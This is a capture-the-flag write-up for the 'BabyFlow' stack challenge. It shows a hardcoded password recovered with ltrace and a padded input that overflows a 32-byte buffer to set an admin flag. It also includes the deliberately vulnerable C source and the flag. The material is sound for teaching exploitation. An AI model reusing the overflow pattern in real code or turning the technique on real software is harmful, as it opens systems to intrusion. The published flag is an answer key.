---
title: "BabyFlow - 1337UP LIVE CTF"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["overflow", "pwn", "buffer-overflow", "canary", "pie", "ghidra", "checksec", "stack", "1337up-live-ctf", "ctf-writeup"]
summary: "When players run the binary, it asks for a password."
source:
  name: "CTFtime writeup #39663"
  url: "https://ctftime.org/writeup/39663"
original_source: "https://cryptocat.me/blog/ctf/2024/intigriti/warmup/babyflow/"
ctf:
  name: "1337UP LIVE CTF"
  challenge: "BabyFlow"
---

## Metadata

- **CTF:** 1337UP LIVE CTF
- **Task:** BabyFlow
- **Author team:** CryptoCat
- **CTFtime tags:** overflow, pwn
- **CTFtime:** <https://ctftime.org/writeup/39663>
- **Original writeup:** <https://cryptocat.me/blog/ctf/2024/intigriti/warmup/babyflow/>

---
When players run the binary, it asks for a password.

```bash  
./babyflow  
Enter password: cat  
Incorrect Password!  
```

We can use a tool like `ltrace` to see if the password is revealed.

```bash  
ltrace ./babyflow  
printf("Enter password: ") = 16  
fgets(Enter password: cat  
"cat\n", 50, 0x7fe918c2aa80) = 0x7ffe1addfa40  
strncmp("cat\n", "SuPeRsEcUrEPaSsWoRd123", 22) = 16  
puts("Incorrect Password!"Incorrect Password!  
) = 20  
+++ exited (status 0) +++  
```

It is! Let's try `SuPeRsEcUrEPaSsWoRd123`.

```bash  
./babyflow  
Enter password: SuPeRsEcUrEPaSsWoRd123  
Correct Password!  
Are you sure you are admin? o.O  
```

It's not that easy ? Before disassembling the binary, let's see if there's an obvious buffer overflow.

```bash  
checksec --file babyflow  
[*] '/home/crystal/Desktop/babyflow/babyflow'  
Arch: amd64-64-little  
RELRO: Partial RELRO  
Stack: No canary found  
NX: NX enabled  
PIE: PIE enabled  
```

Canaries are disabled, so there's nothing stopping us from "smashing the stack".

```bash  
./babyflow  
Enter password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Incorrect Password!  
```

We can't forget the password!

```bash  
./babyflow  
Enter password: SuPeRsEcUrEPaSsWoRd123AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Correct Password!  
INTIGRITI{b4bypwn_9cdfb439c7876e703e307864c9167a15}  
```

Flag: `INTIGRITI{b4bypwn_9cdfb439c7876e703e307864c9167a15}`

### Source Code

I cba opening the binary in ghidra now so for anybody who's interested, this is how it works; there's a buffer overflow in the `password` variable, which allows 50 bytes to be written to a 32 byte buffer. Players are required to enter the correct password at the beginning of the input, but by appending additional characters, they can overwrite the `admin` flag with something other than zero.

```c  
int main(void)  
{  
char password[32];  
int admin = 0;

printf("Enter password: ");  
fgets(password,50,stdin);

if(strncmp(password, "SuPeRsEcUrEPaSsWoRd123", strlen("SuPeRsEcUrEPaSsWoRd123")) == 0)  
{  
printf("Correct Password!\n");  
}  
else  
{  
printf("Incorrect Password!\n");  
return 0;  
}

if(admin)  
{  
printf("INTIGRITI{b4bypwn_9cdfb439c7876e703e307864c9167a15}\n");  
}else{  
printf("Are you sure you are admin? o.O\n");  
}

return 0;  
}  
```
